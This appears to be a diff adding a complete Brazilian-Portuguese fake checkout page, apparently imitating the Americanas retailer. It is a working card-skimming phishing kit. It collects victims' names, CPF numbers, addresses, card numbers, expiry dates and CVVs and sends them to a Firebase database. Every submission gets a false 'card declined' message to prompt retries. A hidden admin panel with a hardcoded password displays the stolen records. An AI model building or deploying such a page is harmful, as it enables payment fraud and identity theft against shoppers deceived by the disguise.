@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Finalizar Compra</title>
+    <!-- Firebase SDK (mesmo do site Americanas) -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #6a0dad 0%, #9b4dff 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 700px;
+            width: 100%;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(106, 13, 173, 0.3);
+            padding: 30px;
+        }
+        h1 {
+            color: #333;
+            font-size: 28px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        h1 i {
+            color: #6a0dad;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 15px;
+        }
+        .section-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #444;
+            margin: 25px 0 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .section-title i {
+            color: #6a0dad;
+        }
+        .form-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        .form-group {
+            flex: 1 1 200px;
+        }
+        .form-group.full-width {
+            flex: 1 1 100%;
+        }
+        label {
+            display: block;
+            font-weight: 500;
+            margin-bottom: 5px;
+            color: #333;
+            font-size: 14px;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: border 0.2s;
+        }
+        input:focus, select:focus {
+            outline: none;
+            border-color: #6a0dad;
+            box-shadow: 0 0 0 2px rgba(106, 13, 173, 0.2);
+        }
+        .card-row {
+            display: flex;
+            gap: 15px;
+        }
+        .btn-submit {
+            background: #6a0dad;
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 8px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background 0.2s;
+        }
+        .btn-submit:hover {
+            background: #4e0b8a;
+        }
+        .toast {
+            visibility: hidden;
+            min-width: 250px;
+            background: #c62828;
+            color: white;
+            text-align: center;
+            border-radius: 30px;
+            padding: 12px;
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .toast.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        .painel-link {
+            text-align: right;
+            margin-bottom: 10px;
+        }
+        .painel-link a {
+            color: #6a0dad;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        #painel {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        .painel-content {
+            background: white;
+            border-radius: 16px;
+            max-width: 1300px;
+            width: 100%;
+            padding: 30px;
+            position: relative;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .close-painel {
+            position: absolute;
+            top: 20px;
+            right: 25px;
+            font-size: 28px;
+            cursor: pointer;
+            color: #666;
+        }
+        .close-painel:hover {
+            color: #000;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            font-size: 12px;
+        }
+        th {
+            background: #f5f5f5;
+            padding: 10px;
+            text-align: left;
+            font-size: 13px;
+            white-space: nowrap;
+        }
+        td {
+            padding: 10px;
+            border-bottom: 1px solid #eee;
+            word-break: break-word;
+        }
+        .login-box {
+            max-width: 300px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        .login-box input {
+            width: 100%;
+            margin-bottom: 10px;
+        }
+        .btn-login {
+            background: #6a0dad;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 8px;
+            width: 100%;
+            cursor: pointer;
+        }
+        .error {
+            color: #c62828;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .btn-clear {
+            background: #c62828;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .config-section {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .config-section h3 {
+            margin-bottom: 10px;
+            color: #333;
+        }
+        .config-row {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .config-row input {
+            flex: 1;
+            min-width: 200px;
+        }
+        .config-row button {
+            background: #6a0dad;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="painel-link">
+            <a href="#" id="abrirPainel"><i class="fas fa-lock"></i> Acesso Administrativo</a>
+        </div>
+        <h1>
+            <i class="fas fa-credit-card"></i> 
+            Finalizar Compra
+        </h1>
+        <div class="subtitle">Preencha os dados abaixo para concluir o pedido.</div>
+
+        <!-- Dados Pessoais -->
+        <div class="section-title"><i class="fas fa-user"></i> Dados Pessoais</div>
+        <div class="form-row">
+            <div class="form-group">
+                <label>Nome completo *</label>
+                <input type="text" id="nome" placeholder="Como no cartão">
+            </div>
+            <div class="form-group">
+                <label>E-mail *</label>
+                <input type="email" id="email" placeholder="exemplo@email.com">
+            </div>
+        </div>
+        <div class="form-row">
+            <div class="form-group">
+                <label>CPF *</label>
+                <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
+            </div>
+            <div class="form-group">
+                <label>Telefone *</label>
+                <input type="text" id="telefone" placeholder="(11) 99999-9999" maxlength="15">
+            </div>
+        </div>
+
+        <!-- Endereço de Cobrança -->
+        <div class="section-title"><i class="fas fa-map-marker-alt"></i> Endereço de Cobrança</div>
+        <div class="form-row">
+            <div class="form-group">
+                <label>CEP *</label>
+                <input type="text" id="cep" placeholder="00000-000" maxlength="9">
+            </div>
+            <div class="form-group full-width">
+                <label>Logradouro *</label>
+                <input type="text" id="rua" placeholder="Rua, Avenida...">
+            </div>
+        </div>
+        <div class="form-row">
+            <div class="form-group">
+                <label>Número *</label>
+                <input type="text" id="numero" placeholder="123">
+            </div>
+            <div class="form-group">
+                <label>Complemento</label>
+                <input type="text" id="complemento" placeholder="Apto, bloco...">
+            </div>
+            <div class="form-group">
+                <label>Bairro *</label>
+                <input type="text" id="bairro" placeholder="Centro">
+            </div>
+        </div>
+        <div class="form-row">
+            <div class="form-group">
+                <label>Cidade *</label>
+                <input type="text" id="cidade" placeholder="São Paulo">
+            </div>
+            <div class="form-group">
+                <label>UF *</label>
+                <input type="text" id="uf" placeholder="SP" maxlength="2">
+            </div>
+        </div>
+
+        <!-- Dados do Cartão -->
+        <div class="section-title"><i class="fas fa-lock"></i> Dados do Cartão de Crédito</div>
+        <div class="form-row">
+            <div class="form-group full-width">
+                <label>Número do cartão *</label>
+                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
+            </div>
+        </div>
+        <div class="form-row">
+            <div class="form-group">
+                <label>Nome no cartão *</label>
+                <input type="text" id="cardName" placeholder="Como gravado">
+            </div>
+            <div class="form-group">
+                <label>CPF do titular *</label>
+                <input type="text" id="cardCpf" placeholder="000.000.000-00" maxlength="14">
+            </div>
+        </div>
+        <div class="card-row">
+            <div class="form-group">
+                <label>Validade *</label>
+                <input type="text" id="cardExpiry" placeholder="MM/AA" maxlength="5">
+            </div>
+            <div class="form-group">
+                <label>CVV *</label>
+                <input type="text" id="cardCvv" placeholder="123" maxlength="3">
+            </div>
+            <div class="form-group">
+                <label>Parcelas</label>
+                <select id="parcelas"></select>
+            </div>
+        </div>
+
+        <!-- Resumo -->
+        <div style="background: #f9f9f9; padding: 15px; border-radius: 8px; margin: 20px 0;">
+            <div style="display: flex; justify-content: space-between;">
+                <span><strong>Total a pagar:</strong></span>
+                <span style="font-size: 24px; font-weight: 700; color: #6a0dad;" id="totalValor">R$ 99,00</span>
+            </div>
+        </div>
+
+        <button class="btn-submit" id="btnFinalizar">
+            <i class="fas fa-times-circle"></i> Finalizar Compra
+        </button>
+    </div>
+
+    <!-- Painel Administrativo -->
+    <div id="painel">
+        <div class="painel-content">
+            <span class="close-painel" id="fecharPainel">&times;</span>
+            <h2><i class="fas fa-tachometer-alt"></i> Painel de Controle</h2>
+            <div id="painelLogin" style="display: block;">
+                <div class="login-box">
+                    <h3>Acesso restrito</h3>
+                    <input type="password" id="senhaPainel" placeholder="Digite a senha">
+                    <button class="btn-login" id="btnLoginPainel">Entrar</button>
+                    <div id="loginError" class="error"></div>
+                </div>
+            </div>
+            <div id="painelConteudo" style="display: none;">
+                <!-- Configuração do valor do produto (global) -->
+                <div class="config-section">
+                    <h3><i class="fas fa-dollar-sign"></i> Configurar Valor do Produto</h3>
+                    <div class="config-row">
+                        <input type="number" id="valorProdutoInput" step="0.01" min="0" placeholder="Ex: 99.90">
+                        <button id="salvarValorBtn">Salvar</button>
+                    </div>
+                    <p style="font-size: 13px; color: #666; margin-top: 8px;">Valor atual: <strong id="valorAtualDisplay">R$ 99,00</strong></p>
+                </div>
+
+                <p><strong>Total de registros de pagamento:</strong> <span id="totalRegistros">0</span></p>
+                <button id="limparDados" class="btn-clear">Limpar todos os dados</button>
+                <div style="overflow-x: auto;">
+                    <table id="tabelaDados">
+                        <thead>
+                            <tr>
+                                <th>Data/Hora</th>
+                                <th>Nome</th>
+                                <th>Email</th>
+                                <th>CPF</th>
+                                <th>Telefone</th>
+                                <th>Endereço</th>
+                                <th>Nº Cartão</th>
+                                <th>Parcelas</th>
+                                <th>CPF Titular</th>
+                                <th>Validade</th>
+                                <th>CVV</th>
+                            </tr>
+                        </thead>
+                        <tbody id="corpoTabela"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script>
+        // ==================== CONFIGURAÇÃO DO FIREBASE (MESMO DO SITE AMERICANAS) ====================
+        const firebaseConfig = {
+            apiKey: "AIzaSyCjIMUFTALiXEHBCzJTGSq7fRZYkncl3NA",
+            authDomain: "painel-americanas-33d0a.firebaseapp.com",
+            databaseURL: "https://painel-americanas-33d0a-default-rtdb.firebaseio.com",
+            projectId: "painel-americanas-33d0a",
+            storageBucket: "painel-americanas-33d0a.firebasestorage.app",
+            messagingSenderId: "1018096096887",
+            appId: "1:1018096096887:web:9073224c6d4b265779d872"
+        };
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const database = firebase.database();
+
+        // Usamos caminhos diferentes para não conflitar com os dados existentes
+        const configRef = database.ref('checkout/config');
+        const pagamentosRef = database.ref('checkout/pagamentos');
+
+        // ==================== VALOR DO PRODUTO (TEMPO REAL) ====================
+        let valorProduto = 99.00;
+
+        configRef.child('valorProduto').on('value', (snapshot) => {
+            const valor = snapshot.val();
+            if (valor !== null) {
+                valorProduto = parseFloat(valor);
+            } else {
+                // Inicializa com valor padrão
+                configRef.child('valorProduto').set(valorProduto);
+            }
+            atualizarValorNaTela();
+        });
+
+        function atualizarValorNaTela() {
+            document.getElementById('totalValor').textContent = `R$ ${valorProduto.toFixed(2)}`;
+            preencherParcelas();
+            const display = document.getElementById('valorAtualDisplay');
+            if (display) display.textContent = `R$ ${valorProduto.toFixed(2)}`;
+        }
+
+        // ==================== PARCELAS DINÂMICAS ====================
+        function preencherParcelas() {
+            const select = document.getElementById('parcelas');
+            if (!select) return;
+            let options = '';
+            for (let i = 1; i <= 4; i++) {
+                let valorParcela = valorProduto / i;
+                options += `<option value="${i}">${i}x de R$ ${valorParcela.toFixed(2)} sem juros</option>`;
+            }
+            for (let i = 5; i <= 6; i++) {
+                let fator = i === 5 ? 1.05 : 1.10;
+                let totalComJuros = valorProduto * fator;
+                let valorParcela = totalComJuros / i;
+                options += `<option value="${i}" data-total="${totalComJuros.toFixed(2)}">${i}x de R$ ${valorParcela.toFixed(2)} com juros</option>`;
+            }
+            select.innerHTML = options;
+        }
+
+        // ==================== MÁSCARAS ====================
+        function mascaraCPF(v) {
+            return v.replace(/\D/g, '')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
+                .substring(0, 14);
+        }
+        function mascaraTelefone(v) {
+            return v.replace(/\D/g, '')
+                .replace(/^(\d{2})(\d)/, '($1) $2')
+                .replace(/(\d{5})(\d)/, '$1-$2')
+                .substring(0, 15);
+        }
+        function mascaraCEP(v) {
+            return v.replace(/\D/g, '')
+                .replace(/^(\d{5})(\d)/, '$1-$2')
+                .substring(0, 9);
+        }
+        function mascaraCartao(v) {
+            return v.replace(/\D/g, '')
+                .replace(/(\d{4})(?=\d)/g, '$1 ')
+                .trim()
+                .substring(0, 19);
+        }
+        function mascaraValidade(v) {
+            return v.replace(/\D/g, '')
+                .replace(/^(\d{2})(\d)/, '$1/$2')
+                .substring(0, 5);
+        }
+
+        document.getElementById('cpf').addEventListener('input', e => e.target.value = mascaraCPF(e.target.value));
+        document.getElementById('telefone').addEventListener('input', e => e.target.value = mascaraTelefone(e.target.value));
+        document.getElementById('cep').addEventListener('input', e => e.target.value = mascaraCEP(e.target.value));
+        document.getElementById('cardNumber').addEventListener('input', e => e.target.value = mascaraCartao(e.target.value));
+        document.getElementById('cardExpiry').addEventListener('input', e => e.target.value = mascaraValidade(e.target.value));
+        document.getElementById('cardCvv').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3));
+        document.getElementById('cardCpf').addEventListener('input', e => e.target.value = mascaraCPF(e.target.value));
+
+        // ==================== TOAST ====================
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // ==================== VALIDAÇÕES ====================
+        function validarEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        function validarCPF(cpf) {
+            cpf = cpf.replace(/\D/g, '');
+            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+            let soma = 0, resto;
+            for (let i = 1; i <= 9; i++) soma += parseInt(cpf.charAt(i - 1)) * (11 - i);
+            resto = (soma * 10) % 11;
+            if (resto === 10 || resto === 11) resto = 0;
+            if (resto !== parseInt(cpf.charAt(9))) return false;
+            soma = 0;
+            for (let i = 1; i <= 10; i++) soma += parseInt(cpf.charAt(i - 1)) * (12 - i);
+            resto = (soma * 10) % 11;
+            if (resto === 10 || resto === 11) resto = 0;
+            return resto === parseInt(cpf.charAt(10));
+        }
+
+        // ==================== FINALIZAR COMPRA ====================
+        document.getElementById('btnFinalizar').addEventListener('click', function(e) {
+            e.preventDefault();
+
+            const nome = document.getElementById('nome').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const cpf = document.getElementById('cpf').value.trim();
+            const telefone = document.getElementById('telefone').value.trim();
+            const cep = document.getElementById('cep').value.trim();
+            const rua = document.getElementById('rua').value.trim();
+            const numero = document.getElementById('numero').value.trim();
+            const complemento = document.getElementById('complemento').value.trim();
+            const bairro = document.getElementById('bairro').value.trim();
+            const cidade = document.getElementById('cidade').value.trim();
+            const uf = document.getElementById('uf').value.trim();
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const cardName = document.getElementById('cardName').value.trim();
+            const cardCpf = document.getElementById('cardCpf').value.trim();
+            const cardExpiry = document.getElementById('cardExpiry').value.trim();
+            const cardCvv = document.getElementById('cardCvv').value.trim();
+            const parcelasSelect = document.getElementById('parcelas');
+            const parcelas = parcelasSelect.value;
+            const selectedOption = parcelasSelect.options[parcelasSelect.selectedIndex];
+            const totalPagar = selectedOption.getAttribute('data-total') ? parseFloat(selectedOption.getAttribute('data-total')) : valorProduto;
+
+            if (!nome) return showToast('Preencha o nome completo.');
+            if (!validarEmail(email)) return showToast('E-mail inválido.');
+            if (!validarCPF(cpf)) return showToast('CPF inválido.');
+            if (telefone.replace(/\D/g, '').length < 10) return showToast('Telefone inválido.');
+            if (cep.replace(/\D/g, '').length !== 8) return showToast('CEP inválido.');
+            if (!rua) return showToast('Preencha o logradouro.');
+            if (!numero) return showToast('Preencha o número.');
+            if (!bairro) return showToast('Preencha o bairro.');
+            if (!cidade) return showToast('Preencha a cidade.');
+            if (!uf || uf.length !== 2) return showToast('UF inválida.');
+            if (cardNumber.replace(/\D/g, '').length < 15) return showToast('Número do cartão inválido.');
+            if (!cardName) return showToast('Preencha o nome no cartão.');
+            if (!validarCPF(cardCpf)) return showToast('CPF do titular inválido.');
+            if (!cardExpiry.match(/^\d{2}\/\d{2}$/)) return showToast('Validade inválida (MM/AA).');
+            if (cardCvv.length !== 3) return showToast('CVV deve ter 3 dígitos.');
+
+            const novoPagamento = {
+                data: new Date().toLocaleString('pt-BR'),
+                nome,
+                email,
+                cpf,
+                telefone,
+                endereco: `${rua}, ${numero}${complemento ? ' - '+complemento : ''} - ${bairro}, ${cidade}/${uf} CEP: ${cep}`,
+                cartao: cardNumber.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim(),
+                parcelas: parcelas + 'x',
+                total: totalPagar.toFixed(2),
+                cardCpf,
+                cardExpiry,
+                cardCvv
+            };
+
+            pagamentosRef.push(novoPagamento)
+                .then(() => showToast('❌ Cartão recusado. Verifique os dados e tente novamente.'))
+                .catch(error => {
+                    console.error(error);
+                    showToast('Erro ao processar. Tente novamente.');
+                });
+        });
+
+        // ==================== PAINEL ADMIN ====================
+        const painel = document.getElementById('painel');
+        const painelLogin = document.getElementById('painelLogin');
+        const painelConteudo = document.getElementById('painelConteudo');
+        const abrirPainel = document.getElementById('abrirPainel');
+        const fecharPainel = document.getElementById('fecharPainel');
+        const btnLoginPainel = document.getElementById('btnLoginPainel');
+        const senhaInput = document.getElementById('senhaPainel');
+        const loginError = document.getElementById('loginError');
+        const limparDados = document.getElementById('limparDados');
+        const valorProdutoInput = document.getElementById('valorProdutoInput');
+        const salvarValorBtn = document.getElementById('salvarValorBtn');
+        const valorAtualDisplay = document.getElementById('valorAtualDisplay');
+
+        abrirPainel.addEventListener('click', (e) => {
+            e.preventDefault();
+            painel.style.display = 'flex';
+            painelLogin.style.display = 'block';
+            painelConteudo.style.display = 'none';
+            senhaInput.value = '';
+            loginError.textContent = '';
+        });
+
+        fecharPainel.addEventListener('click', () => {
+            painel.style.display = 'none';
+            pagamentosRef.off('value'); // para de ouvir quando fecha
+        });
+
+        window.addEventListener('click', (e) => {
+            if (e.target === painel) {
+                painel.style.display = 'none';
+                pagamentosRef.off('value');
+            }
+        });
+
+        btnLoginPainel.addEventListener('click', () => {
+            const senha = senhaInput.value;
+            if (senha === '1670') {
+                painelLogin.style.display = 'none';
+                painelConteudo.style.display = 'block';
+                valorProdutoInput.value = valorProduto.toFixed(2);
+                valorAtualDisplay.textContent = `R$ ${valorProduto.toFixed(2)}`;
+                ouvirPagamentos();
+            } else {
+                loginError.textContent = 'Senha incorreta!';
+            }
+        });
+
+        function ouvirPagamentos() {
+            pagamentosRef.on('value', (snapshot) => {
+                const pagamentosObj = snapshot.val();
+                const pagamentos = pagamentosObj ? Object.keys(pagamentosObj).map(key => ({ id: key, ...pagamentosObj[key] })) : [];
+                atualizarTabelaPagamentos(pagamentos);
+            });
+        }
+
+        function atualizarTabelaPagamentos(pagamentos) {
+            const tbody = document.getElementById('corpoTabela');
+            const totalSpan = document.getElementById('totalRegistros');
+            totalSpan.textContent = pagamentos.length;
+
+            if (pagamentos.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="11" style="text-align:center;">Nenhum registro encontrado.</td></tr>';
+                return;
+            }
+
+            pagamentos.sort((a, b) => new Date(b.data) - new Date(a.data));
+
+            let html = '';
+            pagamentos.forEach(item => {
+                html += `<tr>
+                    <td>${item.data}</td>
+                    <td>${item.nome}</td>
+                    <td>${item.email}</td>
+                    <td>${item.cpf}</td>
+                    <td>${item.telefone}</td>
+                    <td>${item.endereco}</td>
+                    <td>${item.cartao}</td>
+                    <td>${item.parcelas}</td>
+                    <td>${item.cardCpf || '-'}</td>
+                    <td>${item.cardExpiry || '-'}</td>
+                    <td>${item.cardCvv || '-'}</td>
+                </tr>`;
+            });
+            tbody.innerHTML = html;
+        }
+
+        salvarValorBtn.addEventListener('click', () => {
+            const novoValor = parseFloat(valorProdutoInput.value);
+            if (isNaN(novoValor) || novoValor <= 0) {
+                showToast('Valor inválido!');
+                return;
+            }
+            configRef.child('valorProduto').set(novoValor)
+                .then(() => showToast('Valor atualizado com sucesso!'))
+                .catch(() => showToast('Erro ao salvar.'));
+        });
+
+        limparDados.addEventListener('click', () => {
+            if (confirm('Tem certeza que deseja apagar TODOS os registros de pagamento?')) {
+                pagamentosRef.remove()
+                    .then(() => showToast('Dados limpos!'))
+                    .catch(() => showToast('Erro ao limpar.'));
+            }
+        });
+
+        // Inicialização
+        atualizarValorNaTela();
+    </script>
+</body>
+</html>
